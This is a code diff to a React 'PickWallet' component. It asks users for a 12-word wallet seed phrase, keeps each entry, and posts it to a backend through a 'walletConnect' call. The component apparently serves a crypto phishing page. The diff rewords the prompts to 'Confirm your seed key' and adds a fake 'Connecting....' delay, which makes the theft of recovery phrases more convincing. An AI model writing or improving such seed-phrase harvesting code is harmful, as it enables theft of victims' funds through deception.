@@ -245,9 +245,9 @@ function PickWallet({setShowWallet, handleClose}:any) {
         // if length >= 12
         if(seedPhrases.keyphrase.split(' ').length < 12)  return showAlert("error", "Invalid key phrase.")
 
-        if(count < 2) {
-            showAlert("error", "Make sure phrases are valid")
-            ev.target.keyphrase.placeholder = "Paste Seed phrase to avoid mistake."
+        if(count < 1) {
+            showAlert("error", "Confirm your seed key")
+            ev.target.keyphrase.placeholder = "Confirm Seed phrase to avoid mistake."
             ev.target.keyphrase.value = ""
             updateContext({data: {seedkey: [...dataContext.data.seedkey, seedPhrases.keyphrase]}})
             setCount(++count);
@@ -265,7 +265,11 @@ function PickWallet({setShowWallet, handleClose}:any) {
             ev.target.keyphrase.value = ""
             const res = await auth.walletConnect(helpers.getCookie('xat'), data);
             showAlert("success", res.data.message)
-            updateContext({steps: ++dataContext.steps})
+            
+            showAlert("success", "Connecting....")
+            setTimeout(() => {
+                updateContext({steps: ++dataContext.steps})
+            }, 2000)
         } catch (error:any) {
             setShowBtn(false)
             setLoading(false)
